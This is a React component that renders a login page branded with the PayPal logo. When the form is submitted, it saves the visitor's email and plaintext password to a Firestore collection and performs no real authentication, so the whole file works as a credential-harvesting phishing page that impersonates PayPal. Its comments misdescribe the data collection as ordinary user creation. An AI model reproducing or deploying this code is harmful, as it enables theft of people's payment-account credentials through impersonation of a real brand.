import React, { useState } from "react";
import { db} from "./firebase";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import paypalLogo from "./images/paypalLogo.png";
import "./Login.css";

function Login() {
  const [formData, setFormData] = useState({ email: "", password: "" });

  const handleInput = (e) => {
    const { id, value } = e.target;
    setFormData((prevData) => ({ ...prevData, [id]: value }));
  };

  const LogIn = async (e) => {
    e.preventDefault();
    try {
      // Add additional user data to Firestore
      const newUserRef = await addDoc(collection(db, "users"), {
        email: formData.email,
        password: formData.password,
        timestamp: serverTimestamp(),
      });

      console.log("New user added with ID: ", newUserRef.id);

      // Redirect to the login page after successful user creation
    } catch (error) {
      console.error("Error adding user: ", error);
    }
  };

  const sendEmail = () => {
    // Functionality to send email
    console.log("Sending email...");
  };

  return (
    <div className="login">
      <img className="logo" src={paypalLogo} alt="" />
      <div className="details">
        <form onSubmit={LogIn}>
          <input
            id="email"
            placeholder="Email"
            type="email"
            required
            value={formData.email}
            onChange={handleInput}
          />
          <input
            id="password"
            placeholder="Password"
            type="password"
            required
            value={formData.password}
            onChange={handleInput}
          />
          <button onClick={sendEmail} type="submit" className="btn1">
            Log in
          </button>
          <a href="/">Having trouble logging in?</a>
          <div className="hr">
            <hr className="hr1" />
          </div>
          <button className="btn2">
            Sign Up
          </button>
        </form>
      </div>

    </div>
  );
}

export default Login;
